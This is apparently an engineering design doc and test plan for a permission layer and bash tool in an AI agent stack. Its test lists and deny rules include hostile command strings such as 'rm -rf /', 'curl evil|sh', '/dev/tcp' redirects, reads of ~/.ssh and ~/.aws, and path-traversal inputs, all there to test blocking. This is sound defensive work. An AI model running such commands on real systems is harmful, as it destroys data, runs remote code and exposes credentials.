# Tool Permissions & the Bash Tool — Design + Phase 1 Plan

**Status:** Draft for review · **Date:** 2026-06-04 · **Branch:** `permissions-design`

Goal: a Claude-Code / opencode–style permission system for the Andy stack — interactive
"Allow / Allow always / Deny" approvals, persisted to the user profile and project, applied
to **all** tools (not just bash, e.g. "ban Read on `~/.ssh/**`"), and a real executing **bash
tool**. Primary driver: running `andy-cli` / `andy-engine` **inside containers**, where
permissions are *injected up front* so no interactive approval is ever needed.

---

## 1. Current state (what we build on)

Both `andy-engine` and `andy-cli` consume **`andy-tools`** (NuGet `Andy.Tools 2025.10.16-rc.16`)
as the tool framework. ~70% of a permission system already exists there:

| Capability | Location | Status |
|---|---|---|
| `ToolPermissions` (FS/Net/Process/Env + `AllowedPaths`/`BlockedPaths`/`AllowedHosts`/`BlockedHosts`, `ToolSpecificPermissions`, `CustomPermissions`) | `Core/ToolPermissions.cs` | ✅ model |
| `ISecurityManager` enforcement (path boundary, blocked-process denylist, private-IP block, violation recording) | `Execution/SecurityManager.cs` | ✅ runs at exec time |
| `IPermissionProfileService` (load/save/list named profiles) | `Core/IPermissionProfileService.cs` | ✅ profile CRUD |
| Enforcement chokepoint | `Execution/ToolExecutor.cs:136-153` (`EnforcePermissions`) | ✅ single gate |
| `ToolMetadata.RequiresConfirmation` | `Core/ToolMetadata.cs:86` | ⚠️ declared, **never enforced** |
| Resource limits/monitor | `Execution/ResourceMonitor.cs` | ✅ |

**Gaps:**

1. **No interactive consent.** Enforcement is binary allow/deny from a static profile; there is
   no Allow/Ask/Deny prompt. `andy-cli`'s `FeedUserInterface.ConfirmAsync` is **stubbed to never
   prompt**.
2. **No persistence of user decisions** ("remember I allowed `git status`"). Only the theme is
   persisted (`~/.andy/theme.txt`).
3. **No real shell tool, and the wrong model for one.** `andy-cli`'s `BashCommandTool` is
   **display-only** (never spawns a process — this is the "never activated" tool). The only real
   executor is `CliSubprocessTool` (headless-only, fixed-prefix, argv-only, no shell). And
   `SecurityManager` hardcodes `bash`/`sh` into a blocked-process denylist
   (`SecurityManager.cs:21-30`), so a real bash tool can't run until that gate defers to the
   authorizer.

**Not the home for this:** `andy-policies` (server-side governance *catalog*, "enforcement lives
in consumers"), `andy-rbac` (multi-tenant RBAC *server*), `andy-guard` (narrow alpha file-ops lib).
All are server-side governance — wrong layer for local runtime consent. (Decisions *could* later
feed andy-policies' audit chain, out of scope here.)

---

## 2. Decision: where does it live? (`andy-tools` vs new `andy-permissions`)

Two things to place: (A) the **bash/exec tool**, and (B) the **permission engine** (rules,
authorizer, store, prompt seam).

### (A) Bash tool → **`andy-tools`** (`Library/System/ExecuteCommandTool`)

It's a tool; it belongs with the other tools, directly behind `ISecurityManager` + the authorizer.
Engine and CLI both get it; engine stays permission-agnostic. `CliSubprocessTool` is the hardening
reference (argv-only, `UseShellExecute=false`, NUL-byte rejection) — but a general `bash -c "<str>"`
tool is strictly more dangerous, which is the whole reason for the authorizer + command-string
parsing below.

### (B) Permission engine → **new `andy-permissions` package, with a thin interface seam in `andy-tools`**

You're leaning toward a dedicated `andy-permissions` package. Here is the honest trade-off.

**Pros of a separate `andy-permissions`:**
- Clean separation: consent/authorization is a genuinely distinct domain from tool execution.
- Reusable beyond tools — MCP gateway, ACP, other services can authorize actions with the same rules.
- Independent versioning & tests; doesn't bloat `andy-tools`.
- Forces a clean interface boundary instead of reaching into `andy-tools` internals.

**Cons / risks:**
- The **enforcement chokepoint is `ToolExecutor`, inside `andy-tools`**. If the engine lives in a
  separate package, `andy-tools` must either depend on `andy-permissions` (**circular-dependency
  risk**, since `andy-permissions` needs `andy-tools` types like `ToolExecutionContext`/`ToolMetadata`)
  or call it through an interface.
- More cross-repo release choreography (you already juggle many `-rc` packages).
- Easy to *forget to wire it*, leaving tools ungated, unless the seam is first-class.

**Recommended resolution — hybrid (best of both):**

1. **Tiny seam in `andy-tools.Core`** — just the contracts, no logic, no extra deps:
   `IToolPermissionAuthorizer`, `IPermissionPrompt`, `IPermissionStore`, `PermissionRule`,
   `PermissionDecision`, `PermissionRequest`. `ToolExecutor` resolves `IToolPermissionAuthorizer`
   from DI; **if none is registered, behavior is unchanged** (no gating) — zero breakage.
2. **All implementation in `andy-permissions`** — rule matching, store, file persistence, the
   default prompt providers. `andy-permissions` depends on `andy-tools.Core` (one direction only —
   **no cycle**, because `andy-tools` only knows the interfaces).
3. The **bash tool stays in `andy-tools`**, gated by the seam.

This gives you the separate package you want, keeps enforcement a hard-to-bypass first-class step,
and avoids a dependency cycle. For **Phase 1 we don't even touch `andy-tools`** — we ship the engine
as a **decorating `IToolExecutor`** wired by the host. `andy-engine`'s `CapturingToolExecutor`
(in the **Benchmarks** project — a manually-constructed test helper, *not* DI-wired) shows the
mechanics of implementing the full `IToolExecutor` surface and re-raising events; our decorator
must do the same but be registered in DI (see §11 RD6). The seam interfaces get upstreamed into
`andy-tools` only in a later phase once the design is proven.

> **Corrections from design review — see Part II (§11) for the authoritative resolutions.** Key
> points that supersede looser wording above: the decorator returns **`ToolExecutionResult`** (not
> `ToolResult`); it must implement the **full 8-method + 3-event `IToolExecutor` interface**; rule
> `Tool` matches the **snake_case tool id** (`read_file`, `bash_command`, …), not the display name.

```
                       ┌──────────────────────────────────────────────┐
  ToolExecutor /       │  IToolPermissionAuthorizer.EvaluateAsync()    │  (andy-permissions)
  decorating executor ►│    → Allow | Deny | Ask                        │
                       └───────────────────┬──────────────────────────┘
                                           │ if Ask
                       ┌───────────────────▼──────────────────────────┐
                       │  IPermissionPrompt  (the SEAM)                 │  host-supplied:
                       │    TUI · container(no-prompt) · remote broker  │  cli / container / test
                       └───────────────────┬──────────────────────────┘
                                           │ decision (+ remember scope?)
                       ┌───────────────────▼──────────────────────────┐
                       │  IPermissionStore  → layered rule sets         │  (andy-permissions)
                       │  injected ▸ local ▸ project ▸ user ▸ builtin   │
                       └───────────────────────────────────────────────┘
```

---

## 3. The rule model

Mirror Claude Code's `Tool(specifier)` syntax so rules are familiar and copy-pasteable.

```csharp
public enum PermissionOutcome { Allow, Ask, Deny }

public sealed record PermissionRule(
    string Tool,        // "Bash", "Read", "Edit", "WebFetch", "*"
    string Specifier,   // "git status:*", "./secrets/**", "domain:example.com", "*"
    PermissionOutcome Outcome,
    string Source);     // which layer it came from (for diagnostics/UX)
```

Examples:
- `Bash(git status:*)`, `Bash(npm run test:*)` — command-prefix patterns
- `Read(./secrets/**)`, `Edit(~/.ssh/**)`, `Read(/etc/**)` — glob path patterns ← "ban read on dirs"
- `WebFetch(domain:internal.example.com)`
- `Write(*)`

**Evaluation order (the authorizer):**
1. Collect rules from all layers (§4), tag each with its source.
2. **Deny wins** — any matching `Deny` → `Deny` (generalizes today's "BlockedPaths take precedence").
3. Else any matching `Ask` → `Ask`.
4. Else any matching `Allow` → `Allow`.
5. No match → fall back to tool default derived from `ToolMetadata`
   (`RequiresConfirmation` / `RequiredCapabilities`): dangerous capability ⇒ `Ask`, otherwise `Allow`.
6. Most-specific specifier wins ties within an outcome class.

**Bash decomposition (the subtle, must-get-right part):** for `Bash`, split the command string on
`&&`, `||`, `|`, `;`, newlines, and command substitution, then require **every** sub-command to
independently resolve to `Allow`. `git status && rm -rf /` must NOT inherit `git status`'s allow —
the `rm` segment forces `Ask`/`Deny`. This is why a bash tool cannot reuse simple path matching and
why the engine owns command parsing.

---

## 4. Layered store & persistence

`IPermissionStore` merges rule sets by increasing precedence (later overrides earlier within the
same outcome class; **Deny across any layer still wins globally**):

| Layer | Source | Purpose |
|---|---|---|
| builtin | shipped defaults | sane denies (`Read(~/.ssh/**)`, `Bash(rm -rf /:*)` → Deny), common safe allows |
| user | `~/.andy/permissions.json` | personal, cross-project ("remember always" writes here) |
| project | `<repo>/.andy/permissions.json` | shareable, committed |
| local | `<repo>/.andy/permissions.local.json` | personal, gitignored |
| session | in-memory | "allow for this run only" |
| **injected** | **container/CLI bootstrap (highest)** | **pre-seeded for unattended runs (§5)** |

`PermissionDecision` carries a `Scope` so the prompt can persist correctly:

```csharp
public sealed record PermissionDecision(
    PermissionOutcome Outcome,            // Allow | Deny
    PersistScope Persist);                // Once | Session | Project | Local | User

public enum PersistScope { Once, Session, Project, Local, User }
```

"Allow always" = append an `Allow` rule to the chosen layer file via the store. Reuses the existing
`IPermissionProfileService` plumbing where practical. File format: JSON with `allow`/`ask`/`deny`
arrays of rule strings, matching Claude Code's `settings.json#permissions` shape for familiarity.

---

## 5. Container mode — *inject permissions first, never ask*

This is the primary driver and the answer is explicit: **when running in a container, no interactive
approval should ever occur.** Mechanism:

1. **Inject a ruleset at startup** as the highest-precedence `injected` layer, from either:
   - `ANDY_PERMISSIONS_FILE=/path/to/permissions.json` (mounted into the container), or
   - `ANDY_PERMISSIONS_JSON='{...}'` (inline env), or
   - a file baked into the image at a well-known path.
2. The injected layer pre-`Allow`s exactly what the containerized agent needs.
3. The host registers the **non-interactive `IPermissionPrompt`** (`ANDY_PERMISSION_MODE`):
   - `fail-closed` (**default**): anything reaching `Ask` is **denied** (no TTY ⇒ can't prompt). Safe.
   - `bypass`: trusted-sandbox — `Ask` resolves to `Allow` (container is the blast-radius boundary).
     Explicit opt-in only.
4. Because the injected `Allow` rules cover the agent's needs, evaluation returns `Allow` **before**
   ever reaching the prompt — so in practice **no approvals are requested**, which is the goal. The
   `fail-closed` default is just the safety net for anything the injection didn't anticipate.

**Path normalization:** `~` and absolute paths differ inside vs outside the container. The store
resolves path specifiers against `ToolExecutionContext.WorkingDirectory` (already carried through
the executor). Injected rules should be written container-relative.

**Remote broker (future):** keep `IPermissionPrompt` request/decision as serializable DTOs from day
one so a supervisor outside the container can approve over a socket/HTTP later — even though we only
implement TUI + non-interactive now.

---

## 6. Integration point

One chokepoint already exists: `ToolExecutor.ExecuteAsync`, the `EnforcePermissions` block at
`ToolExecutor.cs:136-153`. Two ways to hook in:

- **Phase 1 (no package change):** a **decorating `IToolExecutor`** in `andy-permissions` that runs
  `EvaluateAsync` → prompt → allow/deny **before** delegating to the inner `andy-tools` executor.
  Wired by the host's DI (decoration mechanics in §11 RD6). Reference for the implementation shape:
  `andy-engine/src/Andy.Engine.Benchmarks/Framework/CapturingToolExecutor.cs` implements the full
  `IToolExecutor` surface and re-raises events — but note it is a benchmark helper constructed
  manually, **never registered via DI**, so it is a code template, not a wiring precedent.
- **Later phase:** upstream the `IToolPermissionAuthorizer` call directly into `ToolExecutor`
  (resolved from DI, null ⇒ no-op) and cut a new `andy-tools` package.

---

## 7. Testing strategy

Per `CLAUDE.md`: tests in the test assemblies, run `dotnet test`, verify real behavior.

- **Authorizer unit tests** (bulk; pure, fast, table-driven `[Theory]`): precedence (Deny>Ask>Allow
  across layers), glob matching, `~`/relative/absolute normalization, specificity tie-breaks, and
  **bash decomposition** (`git status && rm -rf /` ⇒ not Allow; `|`/`;`/`&&`/substitution splits;
  quoting edge cases).
- **Store tests:** layer merge + precedence, injected layer wins, round-trip persistence, malformed
  file resilience, concurrent writes, "allow always" writes the right layer.
- **Prompt seam tests:** fake `IPermissionPrompt` asserts it's called **only** on `Ask`, never on
  `Allow`/`Deny`; `Persist` scope writes correctly; fail-closed denies; bypass allows.
- **Executor integration tests** (extend `ToolExecutorTests`/`SecurityManagerTests`): denied tool
  never reaches `ExecuteAsync`; allowed runs; `Ask`→deny aborts pre-exec.
- **Bash tool security tests** (critical): shell-metacharacter injection, `cd ..` path escape, env
  exfiltration, confirm the blocked-process rework opened no hole. Model on `CliSubprocessTool`'s notes.
- **Container tests:** injected ruleset ⇒ no prompt; fail-closed default denies uncovered actions;
  bypass allows; serializable DTO round-trip with a fake transport.

---

## 8. Phasing

1. **Rule model + authorizer + store + decorating executor** in new `andy-permissions`, depending
   only on `andy-tools.Core`. Full unit tests. **No `andy-tools` change.** ← detailed below
2. **`ExecuteCommandTool`** in `andy-tools`; rework `SecurityManager`'s hardcoded bash denylist to
   defer to the authorizer.
3. **`andy-cli`**: TUI `IPermissionPrompt`, un-stub `ConfirmAsync`, retire display-only
   `BashCommandTool`, wire the decorating executor.
4. **Container** `IPermissionPrompt` providers (`fail-closed` + `bypass`) + injection bootstrap
   (`ANDY_PERMISSIONS_FILE` / `ANDY_PERMISSIONS_JSON` / `ANDY_PERMISSION_MODE`).
5. **Upstream** the seam into `andy-tools.ToolExecutor`; cut a new package; bump engine/cli refs.
6. (Optional) remote broker prompt; audit feed to `andy-policies`.

---

## 9. Phase 1 — detailed implementation plan

**Scope:** stand up `andy-permissions` as a standalone, fully-tested package: rules, authorizer,
store, prompt seam, and a decorating `IToolExecutor`. No bash tool yet, no `andy-tools`/`andy-cli`
changes. Provable in isolation via unit tests + a fake inner executor.

**New repo/package:** `rivoli-ai/andy-permissions` (mirror an existing lib layout, e.g.
`andy-tools`: `src/Andy.Permissions/`, `tests/Andy.Permissions.Tests/`, `Directory.Build.props`,
`global.json`, `.sln`). Target `net8.0`, xUnit. Single `PackageReference` to `Andy.Tools` (for
`ToolExecutionContext`/`ToolMetadata`/`IToolExecutor`/`ToolResult`).

**Files to create (`src/Andy.Permissions/`):**

| File | Contents |
|---|---|
| `Model/PermissionOutcome.cs` | enum `Allow/Ask/Deny` |
| `Model/PersistScope.cs` | enum `Once/Session/Project/Local/User` |
| `Model/PermissionRule.cs` | record `(Tool, Specifier, Outcome, Source)` + parse/format `Tool(specifier)` |
| `Model/PermissionRequest.cs` | DTO: tool id, parameters summary, matched rule, human-readable action, risk hint (serializable) |
| `Model/PermissionDecision.cs` | record `(Outcome, Persist)` (serializable) |
| `Matching/SpecifierMatcher.cs` | glob (`**`/`*`) + path normalization (`~`, relative→`WorkingDirectory`, absolute); prefix match for commands; `domain:` for web |
| `Matching/BashCommandSplitter.cs` | split on `&&`/`||`/`|`/`;`/newline/substitution → segments; quoting-aware |
| `Authorization/IToolPermissionAuthorizer.cs` | `Task<PermissionOutcome> EvaluateAsync(string toolId, IReadOnlyDictionary<string,object?> parameters, ToolExecutionContext ctx, CancellationToken)` |
| `Authorization/ToolPermissionAuthorizer.cs` | implements §3 evaluation incl. bash decomposition + `ToolMetadata` fallback |
| `Prompt/IPermissionPrompt.cs` | `Task<PermissionDecision> RequestAsync(PermissionRequest, CancellationToken)` |
| `Prompt/NonInteractivePermissionPrompt.cs` | `fail-closed` (deny) / `bypass` (allow) modes for headless/container |
| `Store/IPermissionStore.cs` | `Task<IReadOnlyList<PermissionRule>> GetRulesAsync()`, `Task AppendAsync(PermissionRule, PersistScope)` |
| `Store/FilePermissionStore.cs` | layered merge: builtin▸user(`~/.andy/permissions.json`)▸project▸local▸session▸injected; JSON `allow`/`ask`/`deny` arrays |
| `Store/BuiltinRules.cs` | shipped denies/allows |
| `Execution/PermissionedToolExecutor.cs` | decorating `IToolExecutor` (all 8 methods + 3 events forwarded; see §11 RD6): Evaluate → (Ask⇒prompt) → Allow delegates to inner / Deny returns failure **`ToolExecutionResult`** (via `ToolExecutionResult.FromToolResult` with `ToolId`/`CorrelationId`/`StartTime`/`EndTime`/`SecurityViolations` set) + raises `SecurityViolation` and `ExecutionCompleted` |
| `DependencyInjection/ServiceCollectionExtensions.cs` | `AddAndyPermissions(...)`: registers authorizer, store, default prompt; helper to load injected layer from `ANDY_PERMISSIONS_FILE`/`_JSON` and read `ANDY_PERMISSION_MODE` |

**Tests to create (`tests/Andy.Permissions.Tests/`):**

| File | Covers |
|---|---|
| `Matching/SpecifierMatcherTests.cs` | globs, `~`/relative/absolute, `domain:`, case sensitivity |
| `Matching/BashCommandSplitterTests.cs` | operator splits, quoting, substitution, `git status && rm -rf /` |
| `Authorization/ToolPermissionAuthorizerTests.cs` | precedence Deny>Ask>Allow, specificity, no-match fallback, per-segment bash allow |
| `Store/FilePermissionStoreTests.cs` | layer merge/precedence, injected wins, round-trip, malformed file, append-to-scope |
| `Prompt/NonInteractivePromptTests.cs` | fail-closed denies, bypass allows |
| `Execution/PermissionedToolExecutorTests.cs` | Allow delegates to fake inner; Deny short-circuits before inner; Ask routes to fake prompt then honors decision; persists on "always" |
| `DependencyInjection/InjectionBootstrapTests.cs` | `ANDY_PERMISSIONS_FILE`/`_JSON` load into injected layer; `ANDY_PERMISSION_MODE` selects prompt |

**Phase 1 done when:** `dotnet test` green; a containerized scenario test proves *injected allow
rules ⇒ inner executor runs with zero prompt calls*, and *uncovered action under fail-closed ⇒
denied before inner*.

---

## 10. Open questions for review

- New `andy-permissions` repo vs a project inside an existing repo for Phase 1? (Plan assumes new repo.)
- JSON file shape: copy Claude Code's `settings.json#permissions` (`allow`/`deny`/`ask` string arrays)
  exactly, for muscle-memory compatibility? (Plan assumes yes.)
- Should `Deny` results surface to the model as a normal tool error (so it can adapt) or as a hard
  abort of the turn? (Plan assumes: return a failure `ToolResult` so the agent can react.)
- Do we want a `plan`/`acceptEdits`-style global mode now, or only rule-driven outcomes? (Plan: rules only for v1.)

---

# Part II — Review resolutions, corrections & expanded test matrix

A design review (2026-06-04) checked the doc against live `andy-tools`/`andy-engine` source. The
resolutions below are **authoritative** and supersede Part I where they conflict.

## 11. Resolved decisions (RD)

**RD1 — Rule key = tool id; parameter→resource mapping via a resolver.**
`PermissionRule.Tool` matches the **snake_case tool id** (verified ids: `read_file`, `write_file`,
`delete_file`, `move_file`, `copy_file`, `list_directory`, `search_text`, `replace_text`,
`file_editor`, `file_search`, `bash_command`, `http_request`, `git_diff`, …). Display names
(`"Read File"`) are **not** used for matching (optional friendly aliases may map `read`→`read_file`
later). An `IToolActionResolver` maps `(toolId, parameters) → IReadOnlyList<ResourceAccess>` where
`ResourceAccess = { ResourceKind Kind (Path|Command|Host|None), string Value }`. Default map:
- `read_file`/`write_file`/`delete_file`/`file_editor` → `file_path` (Path)
- `move_file`/`copy_file` → `source_path` **and** `destination_path` (two Path resources — a Deny on
  *either* blocks the action)
- `list_directory`/`search_text`/`replace_text`/`file_search` → `path`/`directory_path` (Path)
- `bash_command` → `command` (Command)
- `http_request` → `url` → extracted host (Host)
- unknown tool → `[]` (no resource) ⇒ falls through to `ToolMetadata` default (RD2 step 5)

**RD2 — Single, security-first precedence model** (resolves the Part I contradiction):
1. Resolve the action into `ResourceAccess` items (RD1). Bash command splits into one `Command`
   resource per segment (RD7).
2. For each resource, collect every matching rule across all layers, tagged with `(layer, outcome,
   specificity)`.
3. **Deny is absolute**: if *any* matching rule in *any* layer is `Deny` → resource = `Deny`. (So a
   hostile project file's `Allow` cannot override a builtin `Deny`; injected `Allow` cannot either —
   intentional, see RD8/§5 note.)
4. Else the **highest-precedence layer** that matched wins (`injected > session > local > project >
   user > builtin`); within one layer, **most-specific** specifier wins (longest literal,
   non-wildcard character count; documented tie-break). Outcome is that rule's `Allow` or `Ask`.
5. No rule matched the resource → **`ToolMetadata` fallback**: `RequiresConfirmation == true` *or*
   `RequiredCapabilities` has `Destructive`/`Elevated`/`ProcessExecution` ⇒ `Ask`; else `Allow`.
6. Combine the per-resource outcomes for the whole action: `Deny > Ask > Allow`.

**RD3 — Deny disposition = failure result, not exception.** On `Deny` the decorator returns a
`ToolExecutionResult { IsSuccessful = false, ErrorMessage = "<tool> blocked by permission policy:
<reason>", SecurityViolations = [reason], ToolId, CorrelationId, StartTime, EndTime }`, raises
`SecurityViolation` and `ExecutionCompleted`, and does **not** call the inner executor. The agent
sees a normal tool error and can adapt. No turn-aborting exception.

**RD4 — Prompt serialization + re-check.** All `Ask`→prompt round-trips are serialized by a
process-wide `SemaphoreSlim(1,1)` so parallel tool calls never interleave prompts or double-write
the store. After acquiring the lock, **re-evaluate** the action (a concurrent "allow always" may now
cover it) before prompting; only prompt if still `Ask`.

**RD5 — `PermissionDecision` is Allow/Deny only.** `record PermissionDecision(bool Allowed,
PersistScope Persist)` — a *decision* can never be `Ask` (distinct from `PermissionOutcome
{Allow,Ask,Deny}`). Removes the Part I §4 ambiguity.

**RD6 — DI decoration mechanics.** `AddAndyTools` registers `IToolExecutor` via
`TryAddSingleton<IToolExecutor, ToolExecutor>()`. `AddAndyPermissions(...)` must run **after**
`AddAndyTools` and replace the registration: locate the existing `IToolExecutor` descriptor,
re-register the concrete `ToolExecutor` (so it's still constructible), then register `IToolExecutor`
→ `PermissionedToolExecutor` that takes the concrete executor as its inner. (Plain `AddSingleton`
last-wins resolves the public service; the concrete inner is resolved explicitly.) Unit tests
construct `PermissionedToolExecutor(innerFake, authorizer, prompt, store)` directly; a separate DI
test asserts the public `IToolExecutor` resolves to the decorator and forwards the 8 non-execute
members.

**RD7 — Bash splitter fails closed.** `BashCommandSplitter` returns `(segments, parsedCleanly)`.
On anything it cannot safely tokenize (unbalanced quotes, unknown construct, NUL byte) it sets
`parsedCleanly = false`; the authorizer then forces at least `Ask` (or `Deny` under a strict flag),
**never `Allow`**. There is an explicit test asserting fail-closed.

**RD8 — Deny is un-overridable; bypass only collapses Ask.** Builtin/injected `Deny` rules cannot be
overridden by any `Allow` (RD2 step 3). `ANDY_PERMISSION_MODE=bypass` turns `Ask`→`Allow` only —
never `Deny`→`Allow`. Injected `Allow` pre-clears `Ask`s (giving "zero prompts" in containers) but
cannot clear a `Deny`. Builtin denies are therefore kept **minimal and truly dangerous**
(`read_file(~/.ssh/**)`, `read_file(~/.aws/**)`, `bash_command(rm -rf /:*)`, system dirs) so they
rarely collide with legitimate container needs.

**RD9 — Injected-layer source precedence.** If `ANDY_PERMISSIONS_FILE` is set, it is the injected
layer; else `ANDY_PERMISSIONS_JSON`; else a baked image path (`/etc/andy/permissions.json`) if
present; else empty. Single source (no merge) to keep container behavior predictable. `ANDY_PERMISSION_MODE`
defaults to `fail-closed` when unset/empty/unrecognized (garbage is a tested case).

**RD-A5 — Double-enforcement is acknowledged for Phase 1.** The decorator runs *before* `ToolExecutor`,
which still runs `SecurityManager` internally. An authorizer `Allow` is therefore *additive* — the
inner `SecurityManager` may still deny (e.g. its hardcoded `bash`/`sh` denylist at
`SecurityManager.cs:21-30`). Harmless in Phase 1 (no bash tool). Phase 2 reconciles ordering and the
two violation-recording paths. The permission decorator applies **regardless** of a request's
`EnforcePermissions` flag (that flag governs the inner `SecurityManager`, not consent) — so setting
it `false` is not a consent bypass.

## 12. Expanded test matrix (supersedes §7 / §9 test lists)

### 12.1 `BashCommandSplitterTests` (highest-risk parser; assert every segment is surfaced)
- Substitution: `$(...)`, nested `$( $(...) )`, backticks, `<(...)`/`>(...)`.
- Heredocs: `<<EOF`/`<<-EOF`/`<<'EOF'` — operators inside the body are **not** separators.
- Quoting: operators inside `'...'` and `"..."`, escaped `\&\&`, escaped quotes, **unbalanced quotes ⇒ `parsedCleanly=false`**.
- Assignment prefixes: `FOO=bar git status` (cmd is `git`), `FOO=$(curl evil)` (injection ⇒ surfaced).
- Redirects: `> /dev/tcp/host/port`, `>`, `>>`, `2>&1`, `&>`.
- Control: `cmd &`, `cmd & rm -rf /`, `{ a; b; }`, `( subshell )`, `a; ;; b`.
- Comments: `git status # && rm -rf /` (no hidden segment) vs `echo "#x"` (not truncated).
- Line continuation `\`+newline, CRLF vs LF; brace expansion `{a,b}`; `${VAR}`, `$(<file)`.
- Empty / whitespace-only / NUL-byte command ⇒ fail-closed.

### 12.2 `SpecifierMatcherTests` (filesystem reality + traversal)
- Traversal normalized before match: `./secrets/../secrets/x`, `a/../../etc/passwd`, `/etc//passwd`, `//etc/passwd`.
- Symlink note: `Path.GetFullPath` does **not** resolve symlinks — test + document residual risk (TOCTOU, §12.5).
- Case-insensitive FS (macOS/Windows): `read_file(./Secrets/**)` vs `./secrets/x` — pin `OrdinalIgnoreCase` to match `SecurityManager.cs:122`; test both expectations.
- Windows vs POSIX: `\` vs `/`, `C:\`, UNC `\\srv\share`, mixed separators.
- `~`, `~/`, **`~user/`** (naive `.Replace("~",home)` corrupts `~root/x` — test it).
- `WorkingDirectory == null` fallback (it's nullable) — defined + tested.
- Glob: `*` vs `**` directory crossing, trailing-slash dir match, `/etc/**` matching `/etc` itself.
- Command prefix: `git status` must **not** match `git statusx`; argument-boundary + double-space cases.

### 12.3 `ToolPermissionAuthorizerTests` (precedence truth table)
- Allow(layer L) + Deny(layer H) ⇒ Deny (Deny absolute).
- Allow(high) + Ask(low) and Ask(high) + Allow(low) ⇒ per RD2 step 4 (highest layer wins) — full table.
- Injected `Allow` vs builtin `Deny` ⇒ Deny (RD8) — dedicated test.
- Specificity tie-break within a layer (longest literal) — defined + tested.
- `ToolMetadata` fallback: each of `RequiresConfirmation`, `Destructive`, `Elevated`, `ProcessExecution` ⇒ Ask; benign ⇒ Allow.
- Multi-resource (`move_file`): Deny on `destination_path` blocks; Ask on one ⇒ Ask; all Allow ⇒ Allow.
- Bash integration: all-Allow⇒Allow; one-Ask⇒Ask; one-Deny⇒Deny; `parsedCleanly=false`⇒≥Ask (RD7).

### 12.4 `PermissionedToolExecutorTests`
- Prompt **exactly once** on Ask; **zero** on Allow/Deny (counting fake).
- Gating on **both** `ExecuteAsync(request)` and `ExecuteAsync(toolId,params,ctx)`.
- Deny: inner never called (throwing fake inner), result `IsSuccessful==false`, `SecurityViolations` set, `ToolId`/`CorrelationId` populated, `SecurityViolation`+`ExecutionCompleted` raised (RD3).
- Cancellation: pre-cancelled token; cancel **during** `RequestAsync` ⇒ Deny; token threaded into Evaluate/Request.
- Persist-on-always: Allow+`User` writes via store; identical re-call returns Allow with **no second prompt**.
- Parallel: two concurrent `Ask`s ⇒ prompt serialized (fake records max concurrent entry == 1) (RD4).
- Forwarding: `ValidateExecutionRequestAsync`/`Estimate…`/`Cancel…`/`GetRunningExecutions`/`GetStatistics` delegate to inner; events re-raised.

### 12.5 Security suite (negative tests)
- **C2 path-normalization bypass**: `read_file(/etc/**)` Deny not bypassed by `/etc/./passwd`, `/etc//passwd`, trailing dot/space (Windows), mixed separators; matcher normalizes identically to downstream consumer.
- **C3 command-injection evading splitter**: ruleset only `Allow bash_command(git status:*)` ⇒ each of `git status; rm -rf /`, `git status$(rm -rf /)`, `git status && curl evil|sh`, backtick-`rm` resolves to Ask/Deny, never Allow.
- **C4 rule-spoofing**: hostile project `.andy/permissions.json` with `Allow bash_command(*)`/`Allow *(*)` cannot override builtin Deny; high-risk tool Allows from project layer still subject to RD2.
- **C5 bypass blast radius**: `bypass` mode does not turn any builtin/injected Deny into Allow.
- **C1 TOCTOU**: documented test that the decorator authorizes the *string*; downstream tool re-checks at I/O (or accepted residual risk noted).

### 12.6 `FilePermissionStoreTests`
- Atomic writes (temp-file + rename or file lock): N concurrent `AppendAsync` ⇒ no lost updates, never half-written.
- Corruption resilience: truncated JSON, invalid UTF-8, wrong-type (`allow` a string), unknown keys, empty file, missing file, dir-at-path ⇒ ignore that layer, never throw.
- Layer precedence wiring across `~/.andy/…`, `<repo>/.andy/permissions.json`, `permissions.local.json`; missing project dir OK.
- Round-trip fidelity: specifiers with spaces/parens/globs/`domain:`/`)`/`:` parse→format→reparse identical (fuzz `Tool(specifier)` parse).
- Injected rules path-relativity vs `WorkingDirectory` (inside-vs-outside container divergence).

### 12.7 `InjectionBootstrapTests` / container "zero prompt" guarantee
- **Counting fake prompt**: across a multi-tool allowed scenario, `RequestAsync` count == 0, inner executor count == N (proves the headline guarantee).
- `ANDY_PERMISSIONS_FILE` > `_JSON` > baked path precedence when multiple set (RD9).
- `ANDY_PERMISSION_MODE`: default `fail-closed` on unset/empty/garbage; `bypass` only on exact match.
- Env tests run in a non-parallel `[Collection]` and restore env (process-global) to avoid flake.

## 13. Phase-1 corrections (apply to §9)
- Return type everywhere is **`ToolExecutionResult`** (use `FromToolResult`), never `ToolResult`.
- `PermissionedToolExecutor` implements the **full** `IToolExecutor` (8 methods + 3 events) — model
  on `CapturingToolExecutor.cs`.
- Add `Authorization/IToolActionResolver.cs` + `DefaultToolActionResolver.cs` (RD1) and
  `Authorization/ResourceAccess.cs` to the file list; add `Matching/SpecifierMatcherTests` expected
  outcomes for case/separator/`~user` (don't leave "case sensitivity" open).
- Phase-1 bash testing is **unit-only** (`BashCommandSplitter` + authorizer); the end-to-end
  bash-through-decorator path waits for the Phase-2 `ExecuteCommandTool`.
- Resolve **RD3 (deny disposition), RD2 (precedence), RD1 (param map)** are now fixed → Phase-1
  tests in §12 are unblocked.
